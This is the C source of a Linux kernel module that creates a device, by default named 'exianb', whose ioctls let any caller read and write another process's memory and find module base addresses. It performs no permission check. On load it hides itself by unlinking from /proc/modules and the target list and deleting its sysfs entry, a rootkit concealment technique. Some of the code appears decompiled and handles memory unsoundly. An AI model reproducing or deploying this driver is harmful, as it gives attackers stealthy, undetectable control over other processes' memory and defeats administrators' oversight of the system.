#include <linux/module.h>
#include <linux/tty.h>
#include <linux/miscdevice.h>
#include "comm.h"
#include "memory.h"
#include "process.h"

#include <linux/kernel.h> 
#include <linux/module.h> 
#include <linux/proc_fs.h> 
#include <linux/sched.h> 
#include <linux/uaccess.h> 
#include <linux/version.h> 
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0) 
#include <linux/minmax.h> 
#endif 
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/slab.h>     // Memory allocation (kfree)
#include <linux/sysfs.h>    // Sysfs management

 
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0) 
#define HAVE_PROC_OPS 
#endif 
 
#define PROCFS_MAX_SIZE 2048UL 
#define PROCFS_ENTRY_FILENAME "exianb" 
#define DEVICE_NAME "exianb"
static char *my_string = "exianb";
// static struct proc_dir_entry *our_proc_file; 

static struct miscdevice dispatch_misc_device;
module_param(my_string, charp, 0644); // String parameter
MODULE_PARM_DESC(my_string, "Parameter");

int dispatch_open(struct inode *node, struct file *file) {
    return 0;
}

int dispatch_close(struct inode *node, struct file *file) {
    return 0;
}

long dispatch_ioctl(struct file* const file, unsigned int const cmd, unsigned long const arg) {
    static COPY_MEMORY cm;
    static MODULE_BASE mb;
    static char name[0x100] = {0};

    switch (cmd) {
        case OP_READ_MEM:
            {
                if (copy_from_user(&cm, (void __user*)arg, sizeof(cm)) != 0) {
                    pr_err("OP_READ_MEM copy_from_user failed.\n");
                    return -1;
                }
                if (read_process_memory(cm.pid, cm.addr, cm.buffer, cm.size, false) == false) {
                    pr_err("OP_READ_MEM read_process_memory failed.\n");
                    return -1;
                }
            }
            break;
	case OP_RW_MEM:
            {
                if (copy_from_user(&cm, (void __user*)arg, sizeof(cm)) != 0) {
                    pr_err("OP_READ_MEM copy_from_user failed.\n");
                    return -1;
                }
                if (read_process_memory(cm.pid, cm.addr, cm.buffer, cm.size, true) == false) {
                    pr_err("OP_READ_MEM read_process_memory failed.\n");
                    return -1;
                }
            }
            break;
        case OP_WRITE_MEM:
            {
                if (copy_from_user(&cm, (void __user*)arg, sizeof(cm)) != 0) {
                    return -1;
                }
                if (write_process_memory(cm.pid, cm.addr, cm.buffer, cm.size) == false) {
                    return -1;
                }
            }
            break;
        case OP_MODULE_BASE:
            {
                if (copy_from_user(&mb, (void __user*)arg, sizeof(mb)) != 0 
                ||  copy_from_user(name, (void __user*)mb.name, sizeof(name)-1) !=0) {
                    pr_err("OP_MODULE_BASE copy_from_user failed.\n");
                    return -1;
                }
                mb.base = get_module_base(mb.pid, name);
                if (copy_to_user((void __user*)arg, &mb, sizeof(mb)) !=0) {
                    pr_err("OP_MODULE_BASE copy_to_user failed.\n");
                    return -1;
                }
            }
            break;
        default:
            break;
    }
return 0;
}
/*
#ifdef HAVE_PROC_OPS 
static struct proc_ops file_ops_4_our_proc_file = { 
    .proc_ioctl = dispatch_ioctl,
    .proc_open = dispatch_open, 
    .proc_release = dispatch_close, 
}; 
#else 
static const struct file_operations file_ops_4_our_proc_file = { 
    .unlocked_ioctl = dispatch_ioctl,
    .open = dispatch_open, 
    .release = dispatch_close, 
}; 
#endif 
*/

struct file_operations dispatch_functions = {
    .owner   = THIS_MODULE,
    .open    = dispatch_open,
    .release = dispatch_close,
    .unlocked_ioctl = dispatch_ioctl,
};

struct miscdevice misc = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = DEVICE_NAME,
	.fops = &dispatch_functions,
};

static struct list_head *module_prev;         // Store previous module position
static struct kobject *kobject_prev;          // Store previous kobject
static struct kobject *kobject_parent_prev;   // Store parent kobject
static struct module_sect_attrs *sect_attrs_bkp; // Backup section attributes
static struct module_notes_attrs *notes_attrs_bkp; // Backup notes attributes
// static struct list_head *target_list_prev;    // Store previous target list position
// static struct kobject *holders_dir_bkp;       // Backup holders directory
static int module_hidden = 0;                 // Flag to track hidden state

void module_hide(void) {
    if (module_hidden) // If already hidden, return
        return;

    // Store the module’s original list position and kobject references
    module_prev = THIS_MODULE->list.prev;
    kobject_prev = &THIS_MODULE->mkobj.kobj;
    kobject_parent_prev = THIS_MODULE->mkobj.kobj.parent;

    // Backup section and notes attributes
    sect_attrs_bkp = THIS_MODULE->sect_attrs;
    notes_attrs_bkp = THIS_MODULE->notes_attrs;

    // Remove from /proc/modules
    if (list_del_entry_valid(&THIS_MODULE->list)) {
        struct list_head *next = THIS_MODULE->list.next;
        struct list_head *prev = THIS_MODULE->list.prev;
        next->prev = prev;
        prev->next = next;
    }

    // Set the module's list to point to itself
    THIS_MODULE->list.next = &THIS_MODULE->list;
    THIS_MODULE->list.prev = &THIS_MODULE->list;
    
    // Hide module from target list
    struct module *v5;
    struct list_head *v4 = THIS_MODULE->target_list.next;

    if (v4 != &THIS_MODULE->target_list) {
    do {
        v5 = list_entry(v4->next, struct module, list);  // Proper way to get module struct

        if (list_del_entry_valid(&v4[-1])) {
            struct list_head *v7 = v4[-1].next;
            struct list_head *v6 = v4[-1].prev;
            v7->prev = v6;
            v6->next = v7;
        }

        v4[-1].next = (struct list_head *)0xDEAD000000000100LL;
        v4[-1].prev = (struct list_head *)0xDEAD000000000122LL;

        if (list_del_entry_valid(v4)) {
            struct list_head *v9 = v4->next;
            struct list_head *v8 = v4->prev;
            v9->prev = v8;
            v8->next = v9;
        }

        v4->next = (struct list_head *)0xDEAD000000000100LL;
        v4->prev = (struct list_head *)0xDEAD000000000122LL;
        sysfs_remove_link(&THIS_MODULE->mkobj.kobj, THIS_MODULE->name);

        kfree(&v4[-1]);
        v4 = &v5->list; // Move to the next module in the list
    } while (v5 != container_of(&THIS_MODULE->target_list, struct module, list));
    }

    /*
    struct list_head *v4 = THIS_MODULE->target_list.next;
    if (v4 != &THIS_MODULE->target_list) {
        do {
            struct module *v5 = (struct module *)v4->next;
            if (list_del_entry_valid(&v4[-1])) {
                struct list_head *v7 = v4[-1].next;
                struct list_head *v6 = v4[-1].prev;
                v7->prev = v6;
                v6->next = v7;
            }
            v4[-1].next = (struct list_head *)0xDEAD000000000100LL;
            v4[-1].prev = (struct list_head *)0xDEAD000000000122LL;
            if (list_del_entry_valid(v4)) {
                struct list_head *v9 = v4->next;
                struct list_head *v8 = v4->prev;
                v9->prev = v8;
                v8->next = v9;
            }
            struct list_head *v10 = v4[1].prev;
            v4->next = (struct list_head *)0xDEAD000000000100LL;
            v4->prev = (struct list_head *)0xDEAD000000000122LL;
            sysfs_remove_link(v10[15].next, THIS_MODULE->name);
            kfree(&v4[-1]);
            v4 = (struct list_head *)v5;
        } while (v5 != (struct module *)&THIS_MODULE->target_list);
    }
    */
    // Ensure module is properly hidden
    if (list_del_entry_valid(&THIS_MODULE->list)) {
        struct list_head *v12 = THIS_MODULE->list.next;
        struct list_head *v11 = THIS_MODULE->list.prev;
        v12->prev = v11;
        v11->next = v12;
    }

    // Further obfuscate module entry
    THIS_MODULE->list.prev = (struct list_head *)0xDEAD000000000122LL;
    THIS_MODULE->state = MODULE_STATE_UNFORMED;
    
    // Remove from /sys/module
    kobject_del(&THIS_MODULE->mkobj.kobj);
    
    // Nullify attributes to prevent crashes
    THIS_MODULE->sect_attrs = NULL;
    THIS_MODULE->notes_attrs = NULL;

    module_hidden = 1; // Mark module as hidden
}


int __init driver_entry(void) {
    int ret;
    pr_info("[+] device loaded");	
    
    dispatch_misc_device.minor = MISC_DYNAMIC_MINOR;
    dispatch_misc_device.name = my_string; // "exianb";
    dispatch_misc_device.fops = &dispatch_functions;
    
    ret = misc_register(&dispatch_misc_device);

    module_hide();
    
    return ret;
}

void __exit driver_unload(void) {
    pr_info("[+] device unloaded");    
    misc_deregister(&dispatch_misc_device);
}

module_init(driver_entry);
module_exit(driver_unload);

MODULE_AUTHOR("exianb");
MODULE_DESCRIPTION("exianb");
MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
#endif
